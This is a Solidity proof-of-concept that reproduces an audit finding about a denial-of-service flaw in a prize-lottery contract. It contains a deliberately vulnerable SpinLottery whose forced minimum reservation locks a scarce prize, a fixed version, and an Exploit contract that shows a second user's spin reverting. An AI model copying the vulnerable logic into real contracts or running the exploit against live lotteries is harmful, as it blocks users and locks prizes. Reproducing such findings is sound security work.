// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of RipIt finding 62541:
// "[H-04] DoS risk from pending prize locking mechanism".
//
// SpinLottery.calculatePendingPrizesForRarity() contains a "minimum guarantee"
// that, whenever a spin requests _prizeCount > 1 and a rarity has weight > 0,
// forces at least ONE prize of that rarity to be reserved — EVEN when the
// weight-proportional allocation for that rarity rounds down to 0. For a scarce
// high-value rarity (few available prizes) that single forced reservation is
// enough to lock the whole supply as "pending". The subsequent availability
// check in spin() then reverts `InsufficientPrizes` for every following user,
// producing a temporary Denial of Service: one spin locks the scarce rarity and
// blocks everybody else until the pending prizes are cleared.
//
// The min-guarantee line and the availability-check revert are inlined VERBATIM
// from the finding (marked `// @>`). The surrounding prize accounting
// (prizePools / rarityConfigs / getAvailablePrizes + the weight-proportional
// body) is a minimal faithful double of the audited contract's plumbing.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal ERC20 double used only as a harm MARKER: it records the number
///      of scarce prizes locked out of circulation, minted to the SINK.
contract MiniToken {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract (min-guarantee + availability-check revert inlined verbatim).
// ─────────────────────────────────────────────────────────────────────────────
contract SpinLottery {
    struct RarityConfig {
        bool active;
        uint256 weight;
        uint256 basePrice;
    }

    struct PrizePool {
        uint256 total; // physical prizes deposited for this rarity
        uint256 pendingCount; // prizes currently locked/reserved awaiting fulfillment
    }

    error InsufficientPrizes();

    uint8 public maxRarityId;
    mapping(uint8 => RarityConfig) public rarityConfigs;
    mapping(uint8 => PrizePool) public prizePools;

    /// @notice Minimal setter to configure one rarity + its prize supply.
    function configureRarity(uint8 _rarityId, bool _active, uint256 _weight, uint256 _basePrice, uint256 _totalPrizes)
        external
    {
        rarityConfigs[_rarityId] = RarityConfig({active: _active, weight: _weight, basePrice: _basePrice});
        prizePools[_rarityId].total = _totalPrizes;
        if (_rarityId > maxRarityId) {
            maxRarityId = _rarityId;
        }
    }

    /// @notice Physical prizes available for a rarity (none awarded in this reduction).
    function getAvailablePrizes(uint8 _rarityId) public view returns (uint256) {
        return prizePools[_rarityId].total;
    }

    /// @dev Sum of weights over all active rarities (denominator of the weighted allocation).
    function _totalActiveWeight() internal view returns (uint256 total) {
        for (uint8 i = 1; i <= maxRarityId; i++) {
            if (rarityConfigs[i].active) {
                total += rarityConfigs[i].weight;
            }
        }
    }

    function calculatePendingPrizesForRarity(uint256 _prizeCount, uint8 _rarityId) public view returns (uint256) {
        RarityConfig memory config = rarityConfigs[_rarityId];
        if (!config.active) {
            return 0;
        }
        uint256 weight = config.weight;

        // Weight-proportional allocation (minimal faithful double of the real body):
        // a scarce high-value rarity with a small weight share rounds down to 0 here.
        uint256 totalWeight = _totalActiveWeight();
        uint256 pendingCount = (_prizeCount * weight) / totalWeight;

        // Ensure at least some prizes are allocated if weights allow it
        if (_prizeCount > 1 && pendingCount == 0 && weight > 0) { // @> min-guarantee reserves a scarce prize even when the weighted allocation is 0 -> locks the whole scarce supply
            pendingCount = 1;
        }

        return pendingCount;
    }

    function spin(uint256 _prizeCount) external {
        uint256[] memory pendingCounts = new uint256[](uint256(maxRarityId) + 1);
        uint256 totalPending = 0;

        for (uint8 i = 1; i <= maxRarityId; i++) {
            if (rarityConfigs[i].active) {
                pendingCounts[i] = calculatePendingPrizesForRarity(_prizeCount, i);
                totalPending += pendingCounts[i];
            }
        }

        // Check if enough prizes are available considering pending ones
        for (uint8 i = 1; i <= maxRarityId; i++) {
            if (pendingCounts[i] > 0) {
                uint256 available = getAvailablePrizes(i);
                uint256 pending = prizePools[i].pendingCount;

                if (available - pending < pendingCounts[i]) { // @> revert site: once the scarce rarity is locked, every following spin is DoS'd
                    revert InsufficientPrizes();
                }
            }
        }

        // Lock the reserved prizes into the persistent pool (they stay pending until
        // VRF fulfillment). This is the state that carries the DoS from one spin to the next.
        for (uint8 i = 1; i <= maxRarityId; i++) {
            if (pendingCounts[i] > 0) {
                prizePools[i].pendingCount += pendingCounts[i];
            }
        }
    }

    // convenience getter
    function pendingCountOf(uint8 _rarityId) external view returns (uint256) {
        return prizePools[_rarityId].pendingCount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract: the min-guarantee block is removed, so a rarity whose weighted
// allocation is 0 reserves nothing and the scarce supply is never locked.
// ─────────────────────────────────────────────────────────────────────────────
contract SpinLotteryFixed {
    struct RarityConfig {
        bool active;
        uint256 weight;
        uint256 basePrice;
    }

    struct PrizePool {
        uint256 total;
        uint256 pendingCount;
    }

    error InsufficientPrizes();

    uint8 public maxRarityId;
    mapping(uint8 => RarityConfig) public rarityConfigs;
    mapping(uint8 => PrizePool) public prizePools;

    function configureRarity(uint8 _rarityId, bool _active, uint256 _weight, uint256 _basePrice, uint256 _totalPrizes)
        external
    {
        rarityConfigs[_rarityId] = RarityConfig({active: _active, weight: _weight, basePrice: _basePrice});
        prizePools[_rarityId].total = _totalPrizes;
        if (_rarityId > maxRarityId) {
            maxRarityId = _rarityId;
        }
    }

    function getAvailablePrizes(uint8 _rarityId) public view returns (uint256) {
        return prizePools[_rarityId].total;
    }

    function _totalActiveWeight() internal view returns (uint256 total) {
        for (uint8 i = 1; i <= maxRarityId; i++) {
            if (rarityConfigs[i].active) {
                total += rarityConfigs[i].weight;
            }
        }
    }

    function calculatePendingPrizesForRarity(uint256 _prizeCount, uint8 _rarityId) public view returns (uint256) {
        RarityConfig memory config = rarityConfigs[_rarityId];
        if (!config.active) {
            return 0;
        }
        uint256 weight = config.weight;

        uint256 totalWeight = _totalActiveWeight();
        uint256 pendingCount = (_prizeCount * weight) / totalWeight;

        // FIX: no forced minimum — a rarity that allocates to 0 reserves nothing.
        return pendingCount;
    }

    function spin(uint256 _prizeCount) external {
        uint256[] memory pendingCounts = new uint256[](uint256(maxRarityId) + 1);
        uint256 totalPending = 0;

        for (uint8 i = 1; i <= maxRarityId; i++) {
            if (rarityConfigs[i].active) {
                pendingCounts[i] = calculatePendingPrizesForRarity(_prizeCount, i);
                totalPending += pendingCounts[i];
            }
        }

        for (uint8 i = 1; i <= maxRarityId; i++) {
            if (pendingCounts[i] > 0) {
                uint256 available = getAvailablePrizes(i);
                uint256 pending = prizePools[i].pendingCount;

                if (available - pending < pendingCounts[i]) {
                    revert InsufficientPrizes();
                }
            }
        }

        for (uint8 i = 1; i <= maxRarityId; i++) {
            if (pendingCounts[i] > 0) {
                prizePools[i].pendingCount += pendingCounts[i];
            }
        }
    }

    function pendingCountOf(uint8 _rarityId) external view returns (uint256) {
        return prizePools[_rarityId].pendingCount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: UserA's spin locks the single scarce high-rarity prize via the
// min-guarantee; UserB's spin then reverts InsufficientPrizes (temporary DoS).
// The 1 locked-out prize is recorded on a MARKER token minted to the SINK.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d;

    // scarce high-value rarity R (only 1 prize available)
    uint8 internal constant COMMON = 1;
    uint8 internal constant RARE = 2;

    // Exposed results.
    bool public userBReverted;
    uint256 public lockedScarcePrizes;
    uint256 public availableScarcePrizes;
    uint256 public sinkMarkerBalance;
    address public lotteryAddr;
    address public markerAddr;

    function run() external payable {
        SpinLottery lottery = new SpinLottery(); // deploy index 0
        MiniToken marker = new MiniToken("Locked Prize", "LOCKED-PRIZE"); // deploy index 1

        lotteryAddr = address(lottery);
        markerAddr = address(marker);

        // rarity 1 (common): high weight, abundant supply -> never the bottleneck
        lottery.configureRarity(COMMON, true, 95, 0.01 ether, 1000);
        // rarity 2 (scarce high-value R): tiny weight, only ONE prize available
        lottery.configureRarity(RARE, true, 5, 1 ether, 1);

        availableScarcePrizes = lottery.getAvailablePrizes(RARE); // 1

        // --- UserA spins prizeCount=2: weighted alloc for R is (2*5)/100 = 0, but the
        //     min-guarantee bumps it to 1, reserving the lone scarce prize. ---
        lottery.spin(2);
        lockedScarcePrizes = lottery.pendingCountOf(RARE); // 1

        // --- UserB spins prizeCount=2: available(1) - pending(1) = 0 < needed(1) -> revert ---
        try lottery.spin(2) {
            userBReverted = false;
        } catch {
            userBReverted = true;
        }

        // Harm must hold: the scarce prize is locked AND the next user is DoS'd.
        require(lockedScarcePrizes == 1, "scarce prize should be locked");
        require(userBReverted, "UserB spin should revert (DoS)");

        // Record the harm: 1 scarce high-rarity prize locked out of circulation, to SINK.
        marker.mint(SINK, lockedScarcePrizes);
        sinkMarkerBalance = marker.balanceOf(SINK);
    }
}
